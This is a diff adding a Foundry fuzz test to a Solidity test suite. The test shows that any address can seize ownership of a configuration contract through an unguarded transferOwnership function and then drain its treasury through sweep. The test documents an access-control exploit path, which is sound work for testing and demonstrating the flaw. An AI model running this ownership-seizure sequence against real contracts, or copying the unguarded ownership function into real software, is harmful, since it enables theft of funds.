@@ -122,4 +122,25 @@ contract UnprotectedConfigTest is Test {
         vm.expectRevert(AccessControlAttacker.NotOwner.selector);
         attacker.collect();
     }
+
+    /// @notice The bug is not about WHO attacks. Any address in existence can
+    ///         take ownership through the unguarded transferOwnership and then
+    ///         drain the treasury through the guarded sweep.
+    /// @dev The treasury is swept to a known EOA rather than to the fuzzed
+    ///      address, so the assertion does not depend on that address being
+    ///      able to receive ETH.
+    function testFuzz_anyAddressCanSeizeOwnership(address thief) public {
+        vm.assume(thief != address(0));
+        vm.assume(thief != admin);
+        vm.assume(thief != address(config));
+
+        vm.prank(thief);
+        config.transferOwnership(thief);
+        assertEq(config.owner(), thief, "any address at all becomes the owner");
+
+        vm.prank(thief);
+        config.sweep(feeRecipient);
+        assertEq(config.totalAssets(), 0, "treasury drained");
+        assertEq(feeRecipient.balance, TREASURY, "the whole treasury left the contract");
+    }
 }
